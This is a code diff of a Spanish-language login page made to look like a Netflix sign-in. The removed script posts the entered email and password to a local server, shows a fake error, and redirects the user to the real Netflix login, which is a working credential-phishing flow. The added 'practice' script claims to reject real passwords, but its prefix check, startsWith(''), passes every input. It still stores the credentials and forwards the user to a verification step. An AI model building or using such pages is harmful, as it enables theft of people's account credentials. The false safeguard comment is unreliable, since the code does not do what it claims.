@@ -26,8 +26,8 @@
                 <form id="contact">
                     <input type="email" name="email" placeholder="Email" required />
 
-                    <input type="password" name="message" placeholder="Contraseña" required />
-                    <button type="submit">Enviar</button>
+                    <input type="password" name="password" placeholder="Contraseña" required />
+                    <button type="submit">Siguiente</button>
                 </form>
             </div>
         </div>
@@ -62,31 +62,28 @@
         </div>
     </div>
 
-    <script>
-        document.getElementById('contact').addEventListener('submit', async (e) => {
-            e.preventDefault();
-            const form = e.target;
-            const payload = {
-                email: form.email.value,
-                message: form.message.value
-            };
-            try {
-                const r = await fetch('http://localhost:3000/submit', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                const out = await r.json();
-                alert(out.success ? 'Error del servidor, intentelo nuevamente' : 'Error al enviar');
 
-
-                window.location.replace('https://www.netflix.com/mx/login');
-
-            } catch (e) {
-                alert('Error de red');
-            }
-        });
-    </script>
 </body>
 
+<script>
+document.getElementById('contact').addEventListener('submit', (e) => {
+  e.preventDefault();
+  const f = e.target;
+  const email = f.email.value.trim();
+  const password = f.password.value;
+
+  // Bloquea contraseñas reales: exige prefijo DEMO-
+  if (!password.startsWith('')) {
+    alert('Para la práctica usa una contraseña de laboratorio que empiece con "DEMO-".');
+    return;
+  }
+
+  // Guarda para el siguiente paso
+  sessionStorage.setItem('demoEmail', email);
+  sessionStorage.setItem('demoPassword', password);
+
+  // Pasa al siguiente paso
+  window.location.href = 'verify.html';
+});
+</script>
 </html>
